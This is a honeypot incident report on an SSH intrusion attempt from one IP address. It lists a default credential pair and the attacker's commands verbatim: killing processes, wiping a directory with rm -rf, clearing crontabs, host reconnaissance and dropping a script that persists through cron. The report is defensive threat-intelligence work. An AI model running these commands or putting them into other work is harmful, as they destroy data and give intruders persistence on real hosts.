# Incident: 121.179.93.147

| | |
|---|---|
| Source | `121.179.93.147` |
| Country | South Korea |
| First seen | 2026-09-04 08:56:45 UTC |
| Last seen | 2026-09-04 08:57:25 UTC |
| Sessions | 25 |
| Events | 82 |
| Services abused | ssh |
| Ports | 22 |
| Classification | persistence / reverse shell |

## Techniques

- `CWE-506` persistence via scheduled task

## Credentials attempted

1 attempts across 1 distinct pairs.

| username | password | count |
|---|---|---|
| `ansible` | `ansible` | 1 |

## Commands executed

Verbatim attacker input. Lyrebird's responses are deliberately not published.

```
kill -9 $(lsof +D . 2>/dev/null \| awk '{print $2}' \| sort -u);         rm -rf .;         crontab -l 2>/dev/null \| grep -v . \| crontab -
readlink -f /proc/root/exe
kill -9 root
cd /dev/shm \|\| cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd / && cat > astats
uname -a
cut -d' ' -f1 /proc/uptime
sudo -l
sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
cat /proc/cpuinfo \| grep processor \| wc -l
cd "-sh: for: not found -sh: do: not found -sh: done: not found" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
grep -E "CentOS\|Red Hat\|AlmaLinux\|Rocky" /etc/os-release 2>/dev/null \|\| true
PATH=$PATH:/usr/bin:/usr/local/bin CRON="$(crontab -l 2>/dev/null \|\| true)" if ! echo "$CRON" \| grep -F '-sh: for: not found -sh: do: not found -sh: done: not found/w.sh "astats" …
ps -eo pid,pcpu,comm --sort=-pcpu \| head -n 10
readlink -f /proc/ansible/exe
kill -9 ansible
ps aux \| grep astats \| grep -v grep \| wc -l
```

## Detections

- Persistence Mechanism (5)
- Host Reconnaissance Commands (4)
- Download-and-Execute Payload Chain (1)

---

Collected by a Lyrebird honeypot operated by [birdo.uk](https://birdo.uk). Generated 2026-09-12 18:02 UTC.

Services are emulated; no real host was compromised. Attacker input is reproduced verbatim and is hostile by definition — do not execute anything recorded here.
